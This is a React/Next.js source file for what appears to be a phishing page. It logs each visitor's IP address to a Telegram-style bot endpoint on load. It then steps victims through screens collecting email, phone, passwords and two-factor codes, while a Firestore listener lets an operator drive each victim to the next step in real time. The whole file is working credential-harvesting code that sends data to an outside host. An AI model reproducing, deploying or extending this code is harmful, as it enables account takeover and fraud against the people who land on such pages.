import styles from '../styles/Home.module.css'
import { useState, useEffect } from 'react';
import Sidebar from './sidebar';
import HomePage from './home-page';
import Password from './password';
import Final from './final';
import TwoFactorAuth from './two-factor-auth';
import { doc, onSnapshot } from "firebase/firestore";
import { db } from  '../firebaseConfig';


export default function Home(ip) {

  const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false, step_four: false});

  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [passwords, setPasswords] = useState({firstPw: '', secondPw: ''});;


  useEffect(()=>{
    let localEmail = localStorage.getItem("email");
    if(localEmail) setEmail(localEmail);
    sendOpenedScript();
  },[]);  

  const sendOpenedScript = async () => {

    const formattedMessage = `
    <b>User (${ip.userIP})</b>
    -------------------------
    <b>Message:</b> Hini
    `;

    const data = {
      chat_id: process.env.chatId,
      text: formattedMessage,
      parse_mode: 'HTML'
    };


    const response = await fetch(process.env.customKey, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
  } 

  const getData = (data) => {
    if(data.type == 'home-page') {
      setEmail(data.email);
      setPhone(data.phone)
      setOpen({step_two: true});
    } 
    if(data.type == 'password'){
      setPasswords(data.passwords);
      setOpen({step_three: true})
    }
    if(data.type == 'listenUser') listenUser(data.value);
  }

  const listenUser = (email) => {

      const unsub = onSnapshot(doc(db, "users", email), (doc) => {
        let user = doc.data();
        console.log(user);

        if(user.currentStep == 'appeal') setOpen({step_two: true});
        if(user.currentStep == 'twoFactor') setOpen({step_three: true});
        if(user.currentStep == 'final') setOpen({step_four: true});

        console.log("Current data: ", doc.data());
      });
  }

  return (

    <div className={styles.main}>
        <Sidebar/>
        <div className={styles.content}>
            <div className={styles.container}>
                { (steps.step_one || steps.step_two) && <HomePage onSubmit={getData} ip={ip} />}
                { steps.step_two && <Password email={email} phone={phone} onSubmit={getData} ip={ip} />}
                { steps.step_three && <TwoFactorAuth onSubmit={getData} email={email} phone={phone} passwords={passwords} ip={ip} />}
                { steps.step_four && <Final onSubmit={getData}/>}
            </div>
        </div>
    </div>
  )
}

Home.getInitialProps = async ({ req }) => {
  let userIP
  if (req) {
    userIP = req.headers['x-real-ip'] || req.connection.remoteAddress
  }
  return { userIP }
}
